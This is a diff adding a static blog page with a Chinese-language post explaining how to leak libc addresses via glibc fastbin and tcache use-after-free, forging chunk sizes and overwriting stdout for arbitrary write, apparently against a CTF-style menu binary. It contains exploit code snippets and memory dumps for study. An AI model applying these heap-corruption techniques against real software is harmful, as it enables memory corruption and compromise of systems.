@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。 以下情况方法的讨论的前提时可以进行uaf利用 无tcache保护1234create(0x60, 0, &apos;a&apos; * 0x50 + p64(0) + p64(0x71))create(0x60, 1, &apos;b&apos; * 0x50 + p64(0) + p64(0x71))create(0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="以fastbin为基础的leak">
+<meta property="og:url" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。 以下情况方法的讨论的前提时可以进行uaf利用 无tcache保护1234create(0x60, 0, &apos;a&apos; * 0x50 + p64(0) + p64(0x71))create(0x60, 1, &apos;b&apos; * 0x50 + p64(0) + p64(0x71))create(0">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/1.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/2.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/3.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/4.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/7.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/8.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/21.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/22.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/23.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/24.PNG">
+<meta property="og:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/25.PNG">
+<meta property="og:updated_time" content="2019-08-09T06:14:36.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="以fastbin为基础的leak">
+<meta name="twitter:description" content="fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。 以下情况方法的讨论的前提时可以进行uaf利用 无tcache保护1234create(0x60, 0, &apos;a&apos; * 0x50 + p64(0) + p64(0x71))create(0x60, 1, &apos;b&apos; * 0x50 + p64(0) + p64(0x71))create(0">
+<meta name="twitter:image" content="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/"/>
+
+
+
+
+
+  <title>以fastbin为基础的leak | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+
+
+   <a href="https://github.com/you"><img style="position: absolute; top: 0; right: 0; border: 0;"  src="https://ppcrab.github.io/" alt="Fork me on  GitHub"></a>
+   
+
+
+
+
+
+
+  
+  
+    
+  
+   
+   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+   
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            喜欢的一些音乐
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+            
+            我读过的一些书籍以及笔记
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">以fastbin为基础的leak</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T07:55:17+08:00">
+                2019-08-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  809
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>fastbin作为单链表的存在，无法直接泄露libc地址，但是我们也是有方法进行伪造、转换，进行libc地址的泄露的。</p>
+<p>以下情况方法的讨论的前提时可以进行uaf利用</p>
+<h4 id="无tcache保护"><a href="#无tcache保护" class="headerlink" title="无tcache保护"></a>无tcache保护</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x60</span>, <span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">2</span>, <span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">3</span>, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/09/以fastbin为基础的leak/1.PNG" alt="1"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/2.PNG" alt="2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x60, 4, &apos;\x60&apos;)#更改链表，指向我们伪造的地址</span><br><span class="line">create(0x60, 5, &apos;\n&apos;)</span><br><span class="line">create(0x60, 6, &apos;\n&apos;)</span><br><span class="line">create(0x60, 7, p64(0) + p64(0xe1))</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为我们伪造的数据0x71，所以这里我们可以绕过这个malloc的检查</p>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/3.PNG" alt="3"></p>
+<p>成功申请伪造的chunk地址，并且更改了0x005…080的数据，成功的伪造了第二个chunk即大小0xe1,不再进入fastbin链中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/4.PNG" alt="4"></p>
+<p>可以看到unsortbin链中已经有了chunk块</p>
+<p>此时堆中即有了libc地址，或使用程序提供的show函数，或者爆破改写libc地址使之控制stdout或stderr，即可进行libc泄露</p>
+<h5 id="无tcache下的任意地址写"><a href="#无tcache下的任意地址写" class="headerlink" title="无tcache下的任意地址写"></a>无tcache下的任意地址写</h5><p>还是上面那个程序，继续进行利用，使用改写stdout的方式进行libc泄露用以展示任意地址写</p>
+<p>这时候我们已经得到了一个unsortbin块，一方面，再次构造一个unsortbin可以吗？不太好弄，因为这个伪造的chunk块其实也是爆破了2字节出来的，只不过我这里虚拟机的pie关了，所以没有爆破</p>
+<p>直接释放，然后改写地址，再次申请呢？也不行，因为只申请0x60大小的chunk块，只能分割这个unsortbin，没办法申请到任意地址</p>
+<p>还得是伪造chunk块，先分割</p>
+<p>先看一下直接分割伪造的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">create(0x28, 8, &apos;\n&apos;)</span><br><span class="line">create(0x38, 8, &apos;\n&apos;)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/7.PNG" alt="7"></p>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/8.PNG" alt="8"></p>
+<p>这时候就可以进行改写libc地址为stdout或stderr</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p16(<span class="number">0x25dd</span>))<span class="comment">#stderr</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">6</span>, p16(<span class="number">0x25dd</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="number">8</span>, <span class="string">'\0'</span> * <span class="number">0x33</span> + p64(<span class="number">0x00000000fbad2887</span> + <span class="number">0x1000</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">'\x88'</span>)</span><br></pre></td></tr></table></figure>
+<p>剩下的步骤就是改写利用free_hook或者malloc_hook了，不再提及</p>
+<h4 id="有tcache保护"><a href="#有tcache保护" class="headerlink" title="有tcache保护"></a>有tcache保护</h4><p>看一下tcache_get的源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并没有fastbin那么复杂，甚至没有size检查，so，伪造起来很容易</p>
+<p>初期的时候差不多，但是更简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0x21</span>)*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/21.PNG" alt="21"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">0</span>,<span class="string">"\x50"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/22.PNG" alt="22"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555757250:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x555555757260:	0x000055555575720a	0x0000000000000021</span><br></pre></td></tr></table></figure>
+<p>满tcache</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for x in range(7):</span><br><span class="line">	free(0)</span><br></pre></td></tr></table></figure>
+<p>最关键的一步，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename(2,p64(0)+p64(0x51))</span><br><span class="line">free(0)</span><br><span class="line">rename(2,p64(0)+p64(0x91))</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/23.PNG" alt="23"></p>
+<p>关键的原因在于，通过这一步，不仅得到了unsortbin(如果仅仅为了得到unsortbin，可以更简单，先改，然后free八次就够了)</p>
+<p>但是这里多free了一次，因为还要用tcache进行fd的修改</p>
+<h5 id="有tchche的情况下的任意地址写"><a href="#有tchche的情况下的任意地址写" class="headerlink" title="有tchche的情况下的任意地址写"></a>有tchche的情况下的任意地址写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+<span class="string">"\x60\x07\xdd"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">"\n"</span>)</span><br><span class="line">create(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/24.PNG" alt="24"></p>
+<p>至此，完成初步利用</p>
+<p> <img src="/2019/08/09/以fastbin为基础的leak/25.PNG" alt="25"></p>
+<p>成功泄露出libc的地址</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/05/从stdout入手解决leak泄露/" rel="next" title="从stdout入手解决leak泄露">
+                <i class="fa fa-chevron-left"></i> 从stdout入手解决leak泄露
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/photo/hello.jpg"
+                alt="John Doe" />
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://oj.blue-whale.me" target="_blank" title="Blue_Whaleoj">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Blue_Whaleoj</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://bleachz.github.io/" target="_blank" title="DALAO">
+                      
+                        <i class="fa fa-fw fa-globe"></i>DALAO</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#无tcache保护"><span class="nav-number">1.</span> <span class="nav-text">无tcache保护</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#无tcache下的任意地址写"><span class="nav-number">1.1.</span> <span class="nav-text">无tcache下的任意地址写</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有tcache保护"><span class="nav-number">2.</span> <span class="nav-text">有tcache保护</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#有tchche的情况下的任意地址写"><span class="nav-number">2.1.</span> <span class="nav-text">有tchche的情况下的任意地址写</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">21k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+
+  
+
+  
+</body>
+</html>
